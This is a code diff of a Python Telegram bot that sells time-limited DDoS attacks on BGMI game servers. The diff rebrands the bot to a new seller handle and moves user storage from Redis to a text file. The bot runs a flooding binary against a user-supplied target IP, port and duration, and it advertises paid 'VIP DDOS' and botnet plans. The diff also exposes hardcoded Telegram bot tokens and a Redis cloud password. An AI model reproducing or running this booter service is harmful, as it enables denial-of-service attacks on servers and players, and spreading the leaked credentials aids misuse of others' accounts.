@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# MADE BY @its_MATRIX_king
+# MADE BY @InsaneCheatsOwner
 import telebot
 import multiprocessing
 import os
@@ -12,99 +12,94 @@ import logging
 import socket
 import pytz  # Import pytz for timezone handling
 
-bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
+bot = telebot.TeleBot('8128831083:AAFVWHpgVKlfEMXKy3soR1OD4nrFU1Z9Exs')
 
 # Admin user IDs
-admin_id = ["7418099890"]
-admin_owner = ["7418099890"]
-os.system('chmod +x *')
+admin_id = ["7417179294"]
+admin_owner = ["7417179294"]
+
 # File to store allowed user IDs and their expiration times
 USER_FILE = "users.txt"
 cooldown_timestamps = {}
 # File to store command logs
-import redis
-import redis
+LOG_FILE = "log.txt"
 
-redis_client = redis.Redis(
-  host='redis-19547.c330.asia-south1-1.gce.redns.redis-cloud.com',
-  port=19547,
-  password='9lKTBrMRnxCOkjOtaHNPsXNQo0OaoibV')
-# Initialize Redis client
 # Set Indian Standard Time (IST)
 IST = pytz.timezone('Asia/Kolkata')
 
 # Absolute path to the ak.bin file (modify this to point to the correct path)
 AK_BIN_PATH = 'KALUAA'
 
-
-# Function to read user IDs and their expiration times from Redis
+# Function to read user IDs and their expiration times from the file
 def read_users():
-    users = {}
-    for key in redis_client.scan_iter("user:*"):
-        user_id = key.decode("utf-8").split(":")[1]  # Decode the key
-        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
-        if expiration_time:
-            users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
-    return users
+    try:
+        with open(USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            users = {}
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, expiration_time = user_info
+                        users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
+            return users
+    except FileNotFoundError:
+        return {}
 
-# Function to save a user to Redis
-def save_user(user_id, expiration_time):
-    redis_client.set(f"user:{user_id}", expiration_time.isoformat())
-    redis_client.expireat(f"user:{user_id}", expiration_time.timestamp())  # Set TTL
+# Function to save users to file
+def save_users(users):
+    with open(USER_FILE, "w") as file:
+        for user_id, expiration_time in users.items():
+            file.write(f"{user_id} {expiration_time.isoformat()}\n")
 
-# Function to remove expired users from Redis
+# Function to remove expired users
 def remove_expired_users():
+    users = read_users()
     current_time = datetime.now(IST)
-    for key in redis_client.scan_iter("user:*"):
-        expiration_time = redis_client.get(key).decode("utf-8")  # Decode the value
-        if expiration_time:
-            exp_time = datetime.fromisoformat(expiration_time).astimezone(IST)
-            if exp_time <= current_time:
-                redis_client.delete(key)
+  # Ensure current time is in IST
+    print(f"Current time: {current_time}")  # Debug log
+    expired_users = []
+    for user_id, exp_time in users.items():
+        print(f"Checking user {user_id}, Expiration: {exp_time}")  # Debug log
+        # Ensure expired user check works by comparing current time and expiration time
+        if exp_time <= current_time:
+            expired_users.append(user_id)
+            print(f"User {user_id} has expired and will be removed.")  # Debug log
 
-# Handler for adding a user
+    for user_id in expired_users:
+        del users[user_id]
+
+    if expired_users:
+        save_users(users)
+        print(f"Removed expired users: {expired_users}")  # Debug log
+    else:
+        print("No expired users to remove.")  # Debug log
+
 @bot.message_handler(commands=['add'])
 def add_user(message):
-    try:
-        remove_expired_users()  # Clear expired users before adding new ones
-        user_id = str(message.chat.id)
-
-        # Ensure only admins can use the command
-        if user_id in admin_owner:
-            command = message.text.split()
-
-            # Validate the command format
-            if len(command) == 3:
-                user_to_add = command[1]
-
-                # Ensure the expiration time is an integer
-                try:
-                    minutes = int(command[2])
-                except ValueError:
-                    bot.reply_to(message, "Error: Please specify the expiration time as an integer.")
-                    return
-
-                # Calculate expiration time and save the user
-                expiration_time = datetime.now(IST) + timedelta(minutes=minutes)
-                save_user(user_to_add, expiration_time)
-
-                # Prepare response
-                response = (f"User {user_to_add} added successfully.\n"
-                            f"Access valid for {minutes} minutes (Expires at: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')} IST).")
+    remove_expired_users()  # Check for expired users
+    user_id = str(message.chat.id)
+    if user_id in admin_owner:
+        command = message.text.split()
+        if len(command) == 3:
+            user_to_add = command[1]
+            minutes = int(command[2])
+            expiration_time = datetime.now(IST) + timedelta(minutes=minutes)  # Set expiration in IST
+            
+            users = read_users()
+            if user_to_add not in users:
+                users[user_to_add] = expiration_time
+                save_users(users)
+                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
             else:
-                response = "Usage: /add <user_id> <expiration_time_in_minutes>"
+                response = "User already exists."
         else:
-            response = "Only Admin Can Run This Command."
-        
-        # Send response to the admin
-        bot.reply_to(message, response)
+            response = "Please specify a user ID and the expiration time in minutes."
+    else:
+        response = "Only Admin Can Run This Command."
 
-    except Exception as e:
-        # Catch any unexpected error and log it
-        logging.error(f"Error in /add command: {e}")
-        bot.reply_to(message, "An error occurred while processing your request. Please try again.")
+    bot.reply_to(message, response)
 
-# Handler for removing a user
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
     user_id = str(message.chat.id)
@@ -112,9 +107,10 @@ def remove_user(message):
         command = message.text.split()
         if len(command) == 2:
             user_to_remove = command[1]
-            redis_key = f"user:{user_to_remove}"
-            if redis_client.exists(redis_key):  # Check if user exists in Redis
-                redis_client.delete(redis_key)  # Delete user from Redis
+            users = read_users()
+            if user_to_remove in users:
+                del users[user_to_remove]
+                save_users(users)
                 response = f"User {user_to_remove} removed successfully."
             else:
                 response = "User not found."
@@ -122,21 +118,20 @@ def remove_user(message):
             response = "Please specify a user ID to remove."
     else:
         response = "Only Admin Can Run This Command."
-    bot.reply_to(message, response)
 
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
+    remove_expired_users()  # Check for expired users
     user_id = str(message.chat.id)
     if user_id in admin_owner:
-        users = read_users()  # Fetch from Redis
+        users = read_users()
         response = "Authorized Users:\n"
         current_time = datetime.now(IST)
-
-        active_users = [
-            user_id for user_id, exp_time in users.items() if exp_time > current_time
-        ]
-
+  # Get current time in IST
+        active_users = [user_id for user_id, exp_time in users.items() if exp_time > current_time]
+        
         if active_users:
             for user_id in active_users:
                 response += f"- {user_id} (Expires at: {users[user_id]})\n"
@@ -168,7 +163,7 @@ def start_attack_reply(message, target, port, time):
         'start_time': datetime.now(IST)
     })
 
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @InsaneCheatsOwner"
     bot.reply_to(message, response)
 
     full_command = f"./sasuke {target} {port} {time} 60"
@@ -186,7 +181,7 @@ def start_attack_reply(message, target, port, time):
         })
         
         if result.returncode == 0:
-            bot.reply_to(message, f"BGMI Attack Finished \nBY @its_Matrix_King.\nOutput: {result.stdout}")
+            bot.reply_to(message, f"BGMI Attack Finished \nBY @InsaneCheatsOwner.\nOutput: {result.stdout}")
         else:
             bot.reply_to(message, f"Error in BGMI Attack.\nError: {result.stderr}")
     except Exception as e:
@@ -222,7 +217,7 @@ def handle_matrix(message):
     command = message.text.split()
     
     # Initialize response to a default value
-    response = "You Are Not Authorized To Use This Command.\nMADE BY @its_MATRIX_king"
+    response = "You Are Not Authorized To Use This Command.\nMADE BY @InsaneCheatsOwner"
 
     # Check if the user has any ongoing attacks
     if ongoing_attacks:
@@ -298,45 +293,34 @@ def handle_matrix(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    try:
-        user_id = str(message.chat.id)
+    user_id = str(message.chat.id)
 
-        # Basic help text for all users
-        help_text = '''Available Commands:
-    - /matrix : Execute a BGMI server attack (specific conditions apply).
-    - /rulesanduse : View usage rules and important guidelines.
-    - /plan : Check available plans and pricing for the bot.
-    - /status : View ongoing attack details.
-    - /id : Retrieve your user ID.
+    with open('owner.txt', "r") as file:
+        owners = file.read().splitlines()
+
+    help_text = '''Available commands:
+    /matrix : Method For Bgmi Servers. 
+    /rulesanduse : Please Check Before Use !!.
+    /plan : Checkout Our Botnet Rates.
     '''
 
-        # Check if the user is an admin and append admin commands
-        if user_id in admin_id:
-            help_text += '''
-Admin Commands:
-    - /add <user_id> <time_in_minutes> : Add a user with specified time.
-    - /remove <user_id> : Remove a user from the authorized list.
-    - /allusers : List all authorized users.
-    - /broadcast : Send a broadcast message to all users.
+    if user_id in owners:
+        help_text += '''
+To See Admin Commands:
+    /admincmd : Shows All Admin Commands.
+        '''
+
+    help_text += ''' 
+JOIN CHANNEL - @insan3cheats
+BUY / OWNER - @InsaneCheatsOwner
     '''
 
-        # Footer with channel and owner information
-        help_text += ''' 
-JOIN CHANNEL - @MATRIX_CHEATS
-BUY / OWNER - @its_MATRIX_King
-'''
-
-        # Send the constructed help text to the user
-        bot.reply_to(message, help_text)
-    
-    except Exception as e:
-        logging.error(f"Error in /help command: {e}")
-        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
+    bot.reply_to(message, help_text)
     
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRIX_CHEATS\nBUY / OWNER - @its_MATRIX_King "
+    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @insan3cheats\nBUY / OWNER - @InsaneCheatsOwner "
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rulesanduse'])
@@ -347,8 +331,8 @@ def welcome_rules(message):
 1. Time Should Be 180 or Below
 2. Click /status Before Entering Match
 3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
-JOIN CHANNEL - @MATRIX_CHEATS
-BUY / OWNER - @its_MATRIX_King '''
+JOIN CHANNEL - @insan3cheats
+BUY / OWNER - @InsaneCheatsOwner '''
    
     bot.reply_to(message, response)
 
@@ -356,8 +340,8 @@ BUY / OWNER - @its_MATRIX_King '''
 def welcome_plan(message):
     user_name = message.from_user.first_name
     response = f'''{user_name}, 
-    Purchase VIP DDOS Plan From @its_Matrix_King
-    Join Channel @MATRIX_CHEATS
+    Purchase VIP DDOS Plan From @InsaneCheatsOwner
+    Join Channel @insan3cheats
 '''
     bot.reply_to(message, response)
 
@@ -377,16 +361,14 @@ def welcome_plan(message):
         /remove <userId> : Remove a User.
         /allusers : Authorized Users List.
         /broadcast : Broadcast a Message.
-        Channel - @MATRIX_CHEATS
-        Owner/Buy - @its_Matrix_King
+        Channel - @insan3cheats
+        Owner/Buy - @InsaneCheatsOwner
         '''
         bot.reply_to(message, response)
     else:
         response = "You do not have permission to access admin commands."
         bot.reply_to(message, response)
 
-
-# Handler for broadcasting a message
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
     user_id = str(message.chat.id)
@@ -394,16 +376,17 @@ def broadcast_message(message):
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
             message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
-            users = read_users()  # Get users from Redis
-            if users:
-                for user in users:
-                    try:
-                        bot.send_message(user, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
-                response = "Broadcast Message Sent Successfully To All Users."
-            else:
-                response = "No users found in the system."
+            with open('users.txt', "r") as file:
+                users = file.read().splitlines()
+                if users:
+                    for user in users:
+                        try:
+                            bot.send_message(user, message_to_broadcast)
+                        except Exception as e:
+                            print(f"Failed to send broadcast message to user {user}: {str(e)}")
+                    response = "Broadcast Message Sent Successfully To All Users."
+                else:
+                    response = "No users found in users.txt."
         else:
             response = "Please Provide A Message To Broadcast."
     else:
